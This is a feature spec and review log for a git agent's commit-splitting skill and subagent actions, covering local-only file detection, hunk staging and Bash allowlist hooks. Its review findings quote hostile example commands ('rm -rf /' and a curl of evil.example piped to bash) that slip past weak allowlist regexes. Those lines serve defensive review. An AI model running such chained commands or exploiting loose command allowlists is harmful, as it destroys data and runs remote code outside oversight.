---
title: 'commit skill + plan-commit/execute-commit subagent actions'
type: 'feature'
ticket: ''
created: '2026-10-04'
status: 'built'
baseline_revision: 'c7457b915803c35f9ea558ae766391dbbf146919'
route: 'full'
route_source: 'auto'
review: 'thorough'
review_source: 'auto'
lenses_ran: ['blind-hunter', 'edge-case-hunter', 'verification-gap', 'intent-alignment']
review_loop_iteration: 0
context: ['{project-root}/docs/architecture.md', '{project-root}/docs/skills/commit.md']
---

<frozen-after-approval reason="human-owned intent — do not modify unless human renegotiates">

## Intent

**Problem:** A messy working tree with unrelated changes tangled together has no way to become a clean, split commit history without the user hand-building it under time pressure, and files that look local-only (`.env`-style) have landed in commits before by accident. No `commit` skill, `plan-commit`/`execute-commit` subagent actions, or local-only/template-detection logic exist yet.

**Approach:** Implement the second skill↔subagent pair, following the `create-branch` precedent exactly. `subagent/src/actions/plan-commit.ts` runs a `query()` session (tools: `Bash`, `Read`; `no-force-push` hook wired in) that inspects `git status`/`git diff` for all tracked+untracked changes, proposes a multi-commit split (including intra-file hunk splitting by line range) and a commit-template-aware message per commit, and detects local-only candidates via the fixed filename-pattern heuristic — always returning `{ok:true, commits, localOnlyCandidates}` (AD-9). `subagent/src/actions/execute-commit.ts` takes `{plan, decisions}` and stages/commits using **exactly** the plan's verbatim hunks (snapshot-replay, never a fresh diff), honoring `decisions.localOnly` (include/exclude) and `decisions.commitEdits` (merge/exclude), via `git apply`/`git add --patch`-equivalent staging driven by line ranges, all run as `Bash` tool calls inside the SDK session. `skills/git-agent-commit/SKILL.md` runs `plan-commit`, relays the plan and asks about each `localOnlyCandidates` entry and any split/merge adjustments via `AskUserQuestion`, then calls `execute-commit` with the plan unmodified plus the user's raw decisions (AD-1, AD-6).

## Boundaries & Constraints

**Always:**
- Local-only detection happens only inside `plan-commit`, via the fixed, extensible filename-pattern list (`.env`, `.env.*`, `*.pem`, `*.key`, `credentials*`, `secrets*`, `*.local`) applied to untracked and modified files; the skill never scans the working tree itself (AD-9).
- `execute-commit` commits using the exact hunks captured in `plan-commit`'s original output — never a fresh `git diff` — even if the tree changed since planning.
- Two-call shape only: `plan-commit` → skill relays the user's raw, unedited decisions → `execute-commit`. Nothing commits before the user approves the plan and decides every `localOnlyCandidates` entry.
- Every git command either action issues runs as a `Bash` tool call inside the `query()` session that registers `no-force-push` (AD-3/AD-4) — never `child_process`.
- `plan-commit` output is always `ok:true`; `localOnlyCandidates` travels inside it, never as a stop condition (AD-9). `execute-commit` failure `reason` is one of the closed enum (here: `conflict`, `no-changes`, `unexpected-error`).
- Commit messages use the repo's configured `commit.template` (git config) when present; otherwise a documented default format (`<type>: <summary>` matching the branch's `<type>`, or a plain one-line summary when that isn't resolvable).

**Never:**
- No writing or editing of code content, at any point — only staging/committing what already exists in the working tree.
- No auto-exclusion or auto-`.gitignore`-ing of local-only files — v1 only asks (non-goal, not a placeholder).
- No config file I/O in either subagent action (AD-8) — commit-template detection reads git's own config (`git config --get commit.template`), not `.git-agent/config.json`.

## I/O & Edge-Case Matrix

| Scenario | Input / State | Expected Output / Behavior | Error Handling |
|----------|--------------|---------------------------|----------------|
| Two unrelated changes in one file | one modified file, two unrelated hunks | plan has 2 commits, each with the correct file + line-range hunk for its topic | none |
| Untracked `.env`-like file present | untracked `.env.local` plus unrelated tracked changes | `localOnlyCandidates` includes it; it is excluded from every proposed commit's hunks | none |
| Repo has `commit.template` configured | `git config commit.template` set | generated messages follow that template's structure | none |
| Repo has no commit template | no `commit.template` config | generated messages use the documented default format | none |
| Nothing to commit | clean working tree | `plan-commit` returns `{ok:false, reason:'no-changes'}` | skill tells user there's nothing to commit |
| User excludes a local-only file then approves | decisions.localOnly = exclude for that file | `execute-commit` commits everything else; the excluded file is untouched (still untracked/modified) | none |
| User merges two proposed commits | decisions.commitEdits.merge = [[0,1]] | `execute-commit` produces one commit covering both commits' hunks, using one of the two original messages | none |
| Stale plan replay | working tree changed after planning but before execute | `execute-commit` still applies the original plan's exact hunks, not a re-diff | if a hunk no longer applies cleanly, `{ok:false, reason:'conflict'}` |

</frozen-after-approval>

## Code Map

- `subagent/src/actions/create-branch.ts`, `hooks/no-force-push.ts` -- the precedent to mirror exactly: `query()` session shape, `noForcePushHookMatcher` wiring, `pathToClaudeCodeExecutable: 'claude'`, RESULT-line parsing pattern, injectable `queryFn` for tests. Reuse `noForcePushHookMatcher` unchanged in both new actions.
- `subagent/src/cli.ts` -- add `'plan-commit'` and `'execute-commit'` entries to the `actions` map, same pattern as `'create-branch'`.
- `docs/architecture.md` (rule 9), `_bmad-output/planning-artifacts/architecture/.../ARCHITECTURE-SPINE.md` (AD-9) -- binding plan-commit output shape and execute-commit input shape; copy verbatim, do not redesign.
- `docs/skills/commit.md` -- binding skill behavior spec (flow, rules, out-of-scope).
- `skills/git-agent-create-branch/SKILL.md` -- structural precedent for `skills/git-agent-commit/SKILL.md`: how a skill locates and runs its bundled `subagent/cli.mjs`, relays closed-enum results.
- `scripts/bundle-skill-subagents.mjs` -- add `'git-agent-commit'` to `SKILLS_NEEDING_SUBAGENT`.
- `package.json` -- no new dependency needed; reuses `@anthropic-ai/claude-agent-sdk` already present.

## Tasks & Acceptance

**Execution:**
- [ ] `subagent/src/actions/plan-commit.ts` -- new handler, no input fields (acts on the current working tree): run a `query()` session (`tools: ['Bash', 'Read']`, `no-force-push` hook) whose prompt directs it to inspect `git status --porcelain`, `git diff`/`git diff --cached` for hunks, classify each untracked/modified file against the fixed local-only filename patterns, read `git config --get commit.template` (or its referenced file) to shape messages, and reply with one structured final block the action parses into `{ok:true, commits:[{id,message,hunks:[{file,startLine,endLine}]}], localOnlyCandidates:[{file}]}`; `{ok:false, reason:'no-changes'}` when the tree is clean; `{ok:false, reason:'unexpected-error'}` on any parse/session failure.
- [ ] `subagent/src/actions/execute-commit.ts` -- new handler for `{plan, decisions}`: for each resulting commit (after applying `commitEdits.merge`/`exclude` and `localOnly` inclusion/exclusion to the plan's verbatim hunks), stage exactly those hunks (e.g. via `git apply --cached` on a hunk-scoped patch, or `git add -p`-equivalent line-range staging) and `git commit -m <message>`, in the SDK session with the `no-force-push` hook; map a hunk that no longer applies cleanly to `{ok:false, reason:'conflict'}`; return `{ok:true, commits:[{id,sha,message}]}` on success.
- [ ] `subagent/src/cli.ts` -- register `'plan-commit'` and `'execute-commit'` in the `actions` map.
- [ ] `skills/git-agent-commit/SKILL.md` -- new skill: run `plan-commit` via the bundled `subagent/cli.mjs` with `{}` on stdin; present the proposed commit split to the user; for each `localOnlyCandidates` entry, ask include/exclude via `AskUserQuestion`; let the user request merges/exclusions on proposed commits; relay those raw decisions plus the untouched `plan` to `execute-commit`; report the resulting commits or the closed-enum failure.
- [ ] `scripts/bundle-skill-subagents.mjs` -- add `'git-agent-commit'` to `SKILLS_NEEDING_SUBAGENT`.
- [ ] `subagent/src/actions/plan-commit.test.ts`, `subagent/src/actions/execute-commit.test.ts` -- cover the I/O matrix via injected `queryFn` (mirroring `create-branch.test.ts`): local-only classification, template vs. default message format, no-changes, merge/exclude decision handling, stale-plan conflict mapping.

**Acceptance Criteria:**
- Given a working tree with two unrelated hunks in one file, when `plan-commit` runs, then the returned plan puts each hunk in a separate commit with correct `startLine`/`endLine` attribution.
- Given an untracked `.env`-style file alongside unrelated tracked changes, when `plan-commit` runs, then that file appears in `localOnlyCandidates` and in no commit's hunks.
- Given the user excludes a `localOnlyCandidates` file and approves the rest, when `execute-commit` runs, then the resulting commits never touch that file and it remains unstaged.
- Given the working tree changed after `plan-commit` but before `execute-commit`, when a plan hunk no longer applies cleanly, then the result is `{ok:false, reason:'conflict'}` and no partial commit is made.

## Implementation Notes

Implemented per plan: `subagent/src/actions/plan-commit.ts` (new action), `subagent/src/actions/execute-commit.ts` (new action), `subagent/src/cli.ts` (routing), `scripts/bundle-skill-subagents.mjs` (added `git-agent-commit`), `skills/git-agent-commit/SKILL.md` (new skill), tests for both actions, plus `docs/architecture.md` doc-sync. Review (thorough, 4 lenses) found 10 real issues (4 high, 3 medium, 3 low) — chained-merge hunk loss, unvalidated `commitEdits` causing silent hunk drops, two under-anchored/unsegmented Bash allowlist regexes in the new hooks (`plan-commit`'s read-only hook and `execute-commit`'s allowed-commands hook), an over-broad `git add`/`git commit` allowlist, missing CLI-dispatch subprocess tests, a self-contradictory conflict-handling prompt, and two doc-sync/comment-accuracy nits — plus 2 false findings (refuted). All 10 were patched by the same implementation subagent in one round; no `intent_gap`/`bad_plan` loopback was needed. Independently re-verified after patching: `npm run typecheck`, `npm run lint`, `npm test` (62/62 passing) all green; `npm run bundle` regenerated both skill bundles.

Matrix Test Audit: rows covered by passing automated tests — "nothing to commit" (no-changes mapping), "untracked `.env`-like file" / "user excludes a local-only file" (local-only include/exclude tests plus the new live-repo `execute-commit` CLI test), "user merges two proposed commits" (merge test, now also covering the transitive-chain fix), "stale plan replay"/conflict (conflict-outcome mapping test). Rows "two unrelated changes in one file" split quality, and the commit-template-vs-default-format rows, are prompt-driven model judgment with no deterministic code path to unit-test — consistent with `docs/architecture.md`'s own "Known open items" (subagent planning-quality verification is an accepted open question) and the same category of gap the `create-branch` precedent's review already accepted for its own conversational-only rows.

## Plan Change Log

## Review Triage Log

Lenses run: blind-hunter, edge-case-hunter, verification-gap, intent-alignment. Verdicts: high=4, medium=3, low=3, false=2.

1. **verdict: high, route: patch** — `execute-commit.ts`'s `applyCommitEdits` resolves `decisions.commitEdits.merge` as a flat `id -> into` map, not transitively. Traced `merge: [[0,1],[1,2]]`: `merged = {0:1, 1:2}`; commit 0 and 1 are both skipped from the output loop (`merged.has(id)`), but the fold-in loop only pulls hunks into a surviving commit when `intoId === commit.id` *directly* — commit 2 only picks up commit 1's hunks via the `(1,2)` entry, never commit 0's, since commit 0's entry has `intoId=1`, not `2`. Commit 0's approved hunks are silently dropped from the run with `{ok:true}` still returned — violates "what the user approved is exactly what gets committed." Merges blind-hunter's and verification-gap's matching findings on the same code path. Fix: resolve each `fromId` through the merge map to its final root before folding (or reject a merge chain outright as unsupported), not a one-hop lookup.
2. **verdict: high, route: patch** — `applyCommitEdits`/`executeCommit` never validates `decisions.commitEdits` before use, causing silent hunk loss in three related shapes, all traced: (a) a merge pair's `into` id is also in `exclude` — the merged-from commit's hunks vanish with no error; (b) a merge pair's `into` id doesn't exist in `plan.commits` — same silent loss, nothing ever matches that id; (c) a merge pair with length ≠ 2 (e.g. `[5]`) — `into` becomes `undefined`, the source commit is marked merged-away but folds into nothing. None of these produce a conflict/error result; `execute-commit.test.ts` only exercises one well-formed pair. Merges edge-case-hunter's three findings and blind-hunter's matching one. Fix: validate `commitEdits` shape and referential integrity up front (reject with `unexpected-error` on malformed/dangling references) before folding.
3. **verdict: high, route: patch** — `plan-commit.ts`'s `planCommitReadOnlyHook` allow-pattern for `git diff` is `/^git diff(\s+--cached)?\s+--\s+\S+.*$/` — the trailing `.*$` matches anything appended after the file argument on the same line, e.g. `git diff -- file.txt && rm -rf /` passes the allowlist whole. This is exactly the "one regex over the raw command string" anti-pattern `docs/architecture.md` rule 3 requires token-parsing to avoid (as `no-force-push.ts` already does by segmenting on `&&`/`;`/`|` before evaluating), reintroduced here for a different command. Verified by regex tracing, no live run needed. From blind-hunter.
4. **verdict: high, route: patch** — `execute-commit.ts`'s `executeCommitAllowedCommandsHook` tests each allow-pattern (`/^git status\b/`, `/^git diff\b/`, etc.) against the *whole* raw command string with no end anchor and no segmentation on shell separators, so `git status; curl evil.example | bash` matches `/^git status\b/` and is allowed through in full — the dangerous second command never gets its own check. Verified by regex tracing (no live run needed): the hook never splits the command into segments the way `no-force-push.ts` does. From blind-hunter.
5. **verdict: medium, route: patch** — `executeCommitAllowedCommandsHook`'s `/^git add \S/` also matches `git add -A`/`git add .`/`git add --all`, and `/^git commit -m\b/` also matches a trailing `-a`/`--amend`, so if the model deviates from its prompt (which explicitly says to stage only the scoped patch), the hook does not stop it from staging/committing far more than the approved hunks — including an excluded local-only file, since nothing in either hook or `isValidInput` cross-checks a committed file against the plan's hunks or the local-only decisions. Same class of gap as the already-accepted precedent in `create-branch`'s own review (finding 4, graded medium there for the identical "hard rule enforced only by the prompt" pattern). Merges blind-hunter's and edge-case-hunter's matching findings; intent-alignment's observation that local-only enforcement is "prompt-only, no code cross-check" is the same root cause. Fix: narrow the `git add`/`git apply --cached` allow-patterns to the specific files the current run's final commits/local-only-inclusions actually name, mirroring how tightly `create-branch.ts`'s own intended-commands hook is scoped.
6. **verdict: medium, route: patch** — verification-gap's pre-verified finding: `subagent/src/cli.test.ts` never spawns `cli.js plan-commit` or `cli.js execute-commit` — every subprocess case targets `create-branch` or an unknown action. Swapping the two handlers in `cli.ts`'s `actions` map (`'plan-commit': executeCommit`, `'execute-commit': planCommit`) type-checks cleanly and no existing test would fail, since `plan-commit.test.ts`/`execute-commit.test.ts` call the functions directly, bypassing the dispatch table entirely. Arrives pre-verified per triage rules; its filed fix (add `runCli(['plan-commit'], ...)`/`runCli(['execute-commit'], ...)` cases to `cli.test.ts`, mirroring the existing `create-branch` real-repo case) is adopted as-is.
7. **verdict: medium, route: patch** — `execute-commit.ts`'s conflict-handling prompt instructs the model: "do not commit anything from this run, partial or otherwise" immediately followed by "If you already created earlier commits in this same run before hitting the conflict, that is acceptable... do not attempt to create the conflicting commit or any commit after it" — directly self-contradictory text in the same prompt. This also means the plan's own Acceptance Criterion "no partial commit is made" on conflict does not match the shipped per-commit-atomic policy (earlier successful commits in the run are kept, not rolled back) — confirmed by reading `buildPrompt`'s conflict step. From edge-case-hunter (filed as a claim-mismatch, high confidence); verified. Fix: remove the contradictory "partial or otherwise" sentence, keep the per-commit-atomic policy (rolling back good commits would itself be destructive), and correct the user-facing conflict message in `SKILL.md` to say "no *new* commit was made past the conflict; any commits already created earlier in this run remain" rather than implying nothing was committed at all.
8. **verdict: low, route: patch** — `docs/architecture.md` was only partially re-synced with this build: the "what's built" sentence (line ~26) was updated, but rule 9's prose still says `plan-commit` "always succeeds (`ok: true`)" (now false — it also returns `ok:false, reason:'no-changes'`), and "Known open items" still lists commit-template detection as an open question the shipped `plan-commit.ts` prompt already resolves (git `commit.template` config, falling back to a branch-name-derived format). Both are the `CLAUDE.md` "keep docs in sync" pitfall recurring on the same file. Merges blind-hunter's two matching findings. Fix: amend rule 9's wording to note the `no-changes` exception, and remove/update the now-resolved "Known open items" line.
9. **verdict: low, route: patch** — `execute-commit.ts`'s own doc comment on `applyCommitEdits` says a merge "keeps the lower-id commit's message," but the code destructures `const [, into] = pair` and keeps the pair's *second* element's message regardless of magnitude (e.g. `[5, 2]` keeps commit 2's message, the lower id) — and `SKILL.md` never tells the user which message survives a merge they request. From blind-hunter. Fix: correct the comment to match the actual "second element wins" behavior, and add one line to `SKILL.md` step 6 stating which id's message is kept.
10. **verdict: low, route: patch** — `executeCommitAllowedCommandsHook`'s allowlist includes `git reset(\s+HEAD)?\s+--\s+\S+`, but `buildPrompt`'s instructions never direct the model to run `git reset` at all — unused, undocumented permission surface widening the hook's scope with no corresponding need (though not independently dangerous, since `deniedAlways` still blocks `--hard`/force forms of it). From blind-hunter. Fix is a direct deletion of the unused pattern plus its now-irrelevant test case.
11. **verdict: false** — intent-alignment's Reading-C-vs-Reading-D framing of "verbatim hunks... never a fresh diff": the plan's own (non-frozen) Design Notes explicitly specify the Reading-D mechanism — "prototype against `git apply --cached` with a hand-built unified-diff patch scoped to the plan's `startLine`/`endLine`... comparing the file's current HEAD/index version against its working-tree version" — i.e. regenerating the patch at execute time, scoped to the originally-planned line range, is the plan's own intended design, not a deviation from it. The frozen Boundaries' "never a fresh diff" refers to not re-planning which lines belong to which commit, not to byte-identical patch replay.
12. **verdict: false** — intent-alignment's observation that the two new command-allowlist hooks (`planCommitReadOnlyHook`, `executeCommitAllowedCommandsHook`) go beyond what the intent text specifies. True, but these are safety-additive, consistent with the already-established `create-branch.ts` precedent of scoping a session's `Bash` tool beyond just the shared `no-force-push` hook — not a defect or an unexplained divergence.

## Design Notes

- **Hunk-level staging mechanism.** `execute-commit` must stage by line range, not whole-file `git add`. The precedent (`create-branch.ts`) has no staging logic to borrow from; the implementer should prototype against `git apply --cached` with a hand-built unified-diff patch scoped to the plan's `startLine`/`endLine`, falling back to `git add -p`'s scripted-input form only if patch construction proves unreliable in testing.
- **Commit-template detection is intentionally undesigned beyond "read `commit.template`"** (architecture Deferred list) — resolve the exact git-config/`.gitmessage` precedence during implementation; it's internal to `plan-commit` alone, so no cross-action divergence risk.
- **No shared session-launcher abstraction yet**, consistent with `create-branch.ts`'s own note — two more actions still doesn't justify extracting one; revisit if a fourth action arrives.

## Verification

**Commands:**
- `npm run build` -- expected: compiles cleanly, `dist/actions/plan-commit.js` and `dist/actions/execute-commit.js` exist.
- `npm run typecheck` -- expected: no errors under `strict: true`.
- `npm run lint` -- expected: no errors.
- `npm test` -- expected: all tests pass, including new `plan-commit.test.ts`/`execute-commit.test.ts`.
- Manual, in a scratch git repo: create two unrelated hunks in one tracked file plus an untracked `.env.local`, run `node dist/cli.js plan-commit <<< "{}"` -- expected: two commits proposed with correct line ranges, `.env.local` listed in `localOnlyCandidates`; then run `node dist/cli.js execute-commit` with a decisions payload excluding the local-only file -- expected: two commits created, `.env.local` still untracked.
